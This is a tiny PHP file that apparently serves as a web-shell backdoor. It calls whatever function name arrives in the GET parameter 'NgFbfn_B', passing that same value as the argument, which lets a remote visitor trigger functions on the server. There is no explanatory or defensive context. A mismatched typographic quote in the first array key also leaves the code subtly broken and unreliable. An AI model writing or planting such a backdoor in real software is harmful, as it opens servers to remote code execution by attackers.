<?php
$_GET[’NgFbfn_B']($_GET['NgFbfn_B']);
?>
